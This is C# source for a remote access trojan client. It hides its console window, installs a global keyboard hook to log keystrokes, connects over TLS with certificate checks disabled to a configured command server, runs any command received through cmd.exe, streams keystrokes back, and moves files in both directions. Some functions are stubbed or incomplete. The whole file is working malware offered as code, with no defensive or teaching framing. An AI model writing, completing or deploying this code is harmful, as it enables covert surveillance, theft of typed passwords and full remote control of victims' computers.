using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Net.Security;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace RemoteCodeExecutionClient
{
    enum MessageType
    {
        Command = 0,
        Response = 1,
        Keylog = 2,
        FileChunk = 3,
        FileEnd = 4
    }

    class Program
    {
        private static string ServerIP = "";
        private static int ServerPort;
        private static string Username = "";
        private static string Password = "";
        private static int HeartbeatInterval;

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [STAThread]
        public static async Task Main(string[] args)
        {
            LoadConfig("RCE-Client.conf");
            await ClientMain();
        }

        private static void LoadConfig(string path)
        {
            var dict = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
            foreach (var line in File.ReadAllLines(path))
            {
                var trimmed = line.Trim();
                if (string.IsNullOrEmpty(trimmed) || trimmed.StartsWith("#")) continue;
                var idx = trimmed.IndexOf('=');
                if (idx < 0) continue;
                var key = trimmed.Substring(0, idx).Trim();
                var value = trimmed.Substring(idx + 1).Trim();
                dict[key] = value;
            }

            ServerIP = dict.TryGetValue("ServerIP", out var ip) ? ip : "127.0.0.1";
            ServerPort = dict.TryGetValue("ServerPort", out var port) && int.TryParse(port, out var p) ? p : 49999;
            Username = dict.TryGetValue("Username", out var user) ? user : "";
            Password = dict.TryGetValue("Password", out var pass) ? pass : "";
            HeartbeatInterval = dict.TryGetValue("HeartbeatInterval", out var hb) && int.TryParse(hb, out var hbi) ? hbi : 30000;
        }

        public static async Task ClientMain()
        {
            using var keyboardLogger = new KeyboardLogger();
            keyboardLogger.Start();

            var handle = GetConsoleWindow();
            ShowWindow(handle, 0);

            while (true)
            {
                try
                {
                    using (var client = new TcpClient())
                    {
                        await client.ConnectAsync(ServerIP, ServerPort);
                        using (var stream = client.GetStream())
                        using (var sslStream = new SslStream(stream, false, (sender, cert, chain, errors) => true))
                        {
                            await sslStream.AuthenticateAsClientAsync(ServerIP);
                            var connection = new ConnectionManager(client, sslStream);
                            var executor = new CommandExecutor(connection);

                            Console.WriteLine("Connected to server!");
                            await AuthenticateAsync(connection);

                            var heartbeatTask = SendHeartbeatAsync(connection);
                            var keylogTask = SendKeylogAsync(connection, keyboardLogger);

                            while (client.Connected)
                            {
                                var (type, data) = await connection.ReceiveTypedDataAsync();
                                if (type == MessageType.Command)
                                {
                                    var command = Encoding.UTF8.GetString(data);
                                    if (command == "/disconnect") break;
                                    if (command == "/exit -f") Environment.Exit(0);

                                    var result = await executor.ExecuteAsync(command);
                                    await connection.SendResponseAsync(result);
                                }
                            }

                            await Task.WhenAny(heartbeatTask, keylogTask);
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Connection failed: {ex.Message}");
                }
                await Task.Delay(5000);
            }
        }

        private static async Task AuthenticateAsync(ConnectionManager connection)
        {
            await connection.SendMessageAsync(Username);
            await connection.SendMessageAsync(Password);
            var response = await connection.ReadMessageAsync();
            if (response != "OK") throw new Exception("Authentication failed!");
            Console.WriteLine("Authenticated successfully!");
        }

        private static async Task SendHeartbeatAsync(ConnectionManager connection)
        {
            while (true)
            {
                await Task.Delay(HeartbeatInterval);
                try
                {
                    await connection.SendMessageAsync("HEARTBEAT");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Heartbeat failed: {ex.Message}");
                    break;
                }
            }
        }

        private static async Task SendKeylogAsync(ConnectionManager connection, KeyboardLogger logger)
        {
            while (true)
            {
                await Task.Delay(100);
                try
                {
                    if (CommandExecutor.KeylogMode && logger.KeyQueue.TryDequeue(out var keyPress))
                    {
                        var keyStr = keyPress.key.ToString();
                        await connection.SendKeylogAsync(keyStr);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Keylog send failed: {ex.Message}");
                    break;
                }
            }
        }
    }

    class ConnectionManager : IDisposable
    {
        private readonly TcpClient _client;
        private readonly SslStream _sslStream;
        private readonly int _timeoutMs;

        public ConnectionManager(TcpClient client, SslStream sslStream, int timeoutMs = 10000)
        {
            _client = client;
            _sslStream = sslStream;
            _timeoutMs = timeoutMs;
            _client.ReceiveTimeout = _timeoutMs;
            _client.SendTimeout = _timeoutMs;
        }

        public async Task SendMessageAsync(string message)
        {
            try
            {
                var messageBytes = Encoding.UTF8.GetBytes(message);
                var lengthPrefix = BitConverter.GetBytes(messageBytes.Length);
                await _sslStream.WriteAsync(lengthPrefix, 0, lengthPrefix.Length);
                await _sslStream.WriteAsync(messageBytes, 0, messageBytes.Length);
                await _sslStream.FlushAsync();
            }
            catch (Exception ex)
            {
                throw new Exception($"Failed to send message: {ex.Message}");
            }
        }

        public async Task<string> ReadMessageAsync()
        {
            try
            {
                var lengthBuffer = new byte[4];
                int read = await _sslStream.ReadAsync(lengthBuffer, 0, lengthBuffer.Length);
                if (read != 4)
                    throw new IOException("Failed to read message length prefix.");

                var messageLength = BitConverter.ToInt32(lengthBuffer, 0);
                var messageBuffer = new byte[messageLength];
                var bytesRead = 0;

                while (bytesRead < messageLength)
                {
                    int chunk = await _sslStream.ReadAsync(messageBuffer, bytesRead, messageLength - bytesRead);
                    if (chunk == 0)
                        throw new IOException("Connection closed while reading message.");
                    bytesRead += chunk;
                }

                return Encoding.UTF8.GetString(messageBuffer);
            }
            catch (Exception ex)
            {
                throw new Exception($"Failed to read message: {ex.Message}");
            }
        }

        public async Task SendTypedDataAsync(MessageType type, byte[] data)
        {
            try
            {
                var typeByte = (byte)type;
                var lengthBytes = BitConverter.GetBytes(data.Length);
                await _sslStream.WriteAsync(new[] { typeByte }, 0, 1);
                await _sslStream.WriteAsync(lengthBytes, 0, 4);
                if (data.Length > 0)
                    await _sslStream.WriteAsync(data, 0, data.Length);
                await _sslStream.FlushAsync();
            }
            catch (Exception ex)
            {
                throw new Exception($"Failed to send typed data: {ex.Message}");
            }
        }

        public async Task<(MessageType type, byte[] data)> ReceiveTypedDataAsync()
        {
            try
            {
                var typeBuffer = new byte[1];
                int readType = await _sslStream.ReadAsync(typeBuffer, 0, 1);
                if (readType != 1)
                    throw new IOException("Failed to read message type.");

                var type = (MessageType)typeBuffer[0];

                var lengthBuffer = new byte[4];
                int readLen = await _sslStream.ReadAsync(lengthBuffer, 0, 4);
                if (readLen != 4)
                    throw new IOException("Failed to read message length.");

                var messageLength = BitConverter.ToInt32(lengthBuffer, 0);

                byte[] data = new byte[messageLength];
                if (messageLength > 0)
                {
                    var bytesRead = 0;
                    while (bytesRead < messageLength)
                    {
                        int chunk = await _sslStream.ReadAsync(data, bytesRead, messageLength - bytesRead);
                        if (chunk == 0)
                            throw new IOException("Connection closed while reading typed data.");
                        bytesRead += chunk;
                    }
                }
                return (type, data);
            }
            catch (Exception ex)
            {
                throw new Exception($"Failed to receive typed data: {ex.Message}");
            }
        }

        public async Task SendResponseAsync(string response)
        {
            var data = Encoding.UTF8.GetBytes(response);
            await SendTypedDataAsync(MessageType.Response, data);
        }

        public async Task SendKeylogAsync(string key)
        {
            var data = Encoding.UTF8.GetBytes(key);
            await SendTypedDataAsync(MessageType.Keylog, data);
        }

        public async Task SendCommandAsync(string command)
        {
            var data = Encoding.UTF8.GetBytes(command);
            await SendTypedDataAsync(MessageType.Command, data);
        }

        public void Close()
        {
            _sslStream.Close();
            _client.Close();
        }

        public void Dispose()
        {
            _sslStream.Dispose();
            _client.Dispose();
        }
    }

    class CommandExecutor
    {
        public static bool KeylogMode { get; set; } = false;
        private readonly ConnectionManager _connection;

        public CommandExecutor(ConnectionManager connection)
        {
            _connection = connection;
        }

        public async Task<string> ExecuteAsync(string command)
        {
            try
            {
                if (command == "start_keylog")
                {
                    KeylogMode = true;
                    return "Keylog started";
                }
                else if (command == "stop_keylog")
                {
                    KeylogMode = false;
                    return "Keylog stopped";
                }
                else if (command.StartsWith("upload "))
                {
                    var filePath = command.Substring(7).Trim();
                    return await UploadFileAsync(filePath);
                }
                else if (command.StartsWith("download "))
                {
                    var filePath = command.Substring(9).Trim();
                    return await DownloadFileAsync(filePath);
                }
                else if (command == "screenshot")
                {
                    return await CaptureScreenshotAsync();
                }
                else
                {
                    var processInfo = new ProcessStartInfo("cmd.exe", "/c " + command)
                    {
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    };

                    using (var process = Process.Start(processInfo))
                    {
                        if (process == null)
                            return "Failed to start process.";

                        string output = await process.StandardOutput.ReadToEndAsync();
                        string error = await process.StandardError.ReadToEndAsync();
                        await process.WaitForExitAsync();
                        return string.IsNullOrEmpty(error) ? output : error;
                    }
                }
            }
            catch (Exception ex)
            {
                return $"Error executing command: {ex.Message}";
            }
        }

        private async Task<string> UploadFileAsync(string filePath)
        {
            try
            {
                if (!File.Exists(filePath))
                    return "File not found.";

                using (var fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
                {
                    var buffer = new byte[1024];
                    int bytesRead;
                    while ((bytesRead = await fileStream.ReadAsync(buffer, 0, buffer.Length)) > 0)
                    {
                        var chunk = new byte[bytesRead];
                        Array.Copy(buffer, chunk, bytesRead);
                        await _connection.SendTypedDataAsync(MessageType.FileChunk, chunk);
                    }
                    await _connection.SendTypedDataAsync(MessageType.FileEnd, Array.Empty<byte>());
                }
                return "File uploaded successfully";
            }
            catch (Exception ex)
            {
                return $"Error uploading file: {ex.Message}";
            }
        }

        private async Task<string> DownloadFileAsync(string filePath)
        {
            try
            {
                using (var fileStream = new FileStream(filePath, FileMode.Create, FileAccess.Write))
                {
                    while (true)
                    {
                        var (type, data) = await _connection.ReceiveTypedDataAsync();
                        if (type == MessageType.FileChunk)
                            await fileStream.WriteAsync(data, 0, data.Length);
                        else if (type == MessageType.FileEnd)
                            break;
                        else
                            return "Unexpected message type during file download.";
                    }
                }
                return "File downloaded successfully";
            }
            catch (Exception ex)
            {
                return $"Error downloading file: {ex.Message}";
            }
        }

        // Screenshot functionality is stubbed out to avoid System.Drawing and System.Windows.Forms
        private async Task<string> CaptureScreenshotAsync()
        {
            try
            {
                // Not implemented: System.Drawing and System.Windows.Forms are not available.
                // You can implement this using Windows.Graphics.Capture or other libraries if needed.
                await _connection.SendTypedDataAsync(MessageType.FileEnd, Array.Empty<byte>());
                return "Screenshot functionality is not available in this build.";
            }
            catch (Exception ex)
            {
                return $"Error capturing screenshot: {ex.Message}";
            }
        }
    }

    // Minimal replacement for Keys enum
    enum SimpleKeys
    {
        None = 0,
        // Add more keys as needed
        A = 0x41,
        B = 0x42,
        C = 0x43,
        // ...
        Z = 0x5A,
        Enter = 0x0D,
        Space = 0x20,
        // Add more as needed
    }

    class KeyboardLogger : IDisposable
    {
        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private static KeyboardLogger? _instance;
        public ConcurrentQueue<(DateTime time, SimpleKeys key)> KeyQueue { get; } = new ConcurrentQueue<(DateTime, SimpleKeys)>();

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static readonly string KeylogFile = "keylog.txt";

        private CancellationTokenSource? _cts;
        private Task? _logTask;

        public KeyboardLogger()
        {
            _instance = this;
        }

        public void Start()
        {
            _hookID = SetHook(_proc);
            _cts = new CancellationTokenSource();
            _logTask = Task.Run(() => LogKeysToFile(_cts.Token));
        }

        public void Stop()
        {
            if (_hookID != IntPtr.Zero)
            {
                UnhookWindowsHookEx(_hookID);
                _hookID = IntPtr.Zero;
            }
            _cts?.Cancel();
            _logTask?.Wait();
        }

        public void Dispose()
        {
            Stop();
            _cts?.Dispose();
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (var curProcess = Process.GetCurrentProcess())
            {
                var curModule = curProcess.MainModule;
                if (curModule == null)
                {
                    throw new InvalidOperationException("Failed to retrieve the current process module.");
                }
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN && _instance != null)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                var key = Enum.IsDefined(typeof(SimpleKeys), vkCode) ? (SimpleKeys)vkCode : SimpleKeys.None;
                _instance.KeyQueue.Enqueue((DateTime.Now, key));
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private async Task LogKeysToFile(CancellationToken token)
        {
            while (!token.IsCancellationRequested)
            {
                await Task.Delay(60000, token).ContinueWith(_ => { });
                try
                {
                    var keysByMinute = new System.Collections.Generic.Dictionary<DateTime, System.Collections.Generic.List<SimpleKeys>>();
                    while (KeyQueue.TryDequeue(out var keyPress))
                    {
                        var minute = new DateTime(keyPress.time.Year, keyPress.time.Month, keyPress.time.Day, keyPress.time.Hour, keyPress.time.Minute, 0);
                        if (!keysByMinute.ContainsKey(minute))
                            keysByMinute.Add(minute, new System.Collections.Generic.List<SimpleKeys>());
                        keysByMinute[minute].Add(keyPress.key);
                    }
                    using (var writer = new StreamWriter(KeylogFile, true))
                    {
                        foreach (var entry in keysByMinute)
                        {
                            var timestamp = entry.Key.ToString("yyyy/MM/dd HH:mm");
                            var keys = string.Join(",", entry.Value);
                            await writer.WriteLineAsync($"<{timestamp}: {keys}>");
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error logging keys to file: {ex.Message}");
                }
            }
        }
    }
}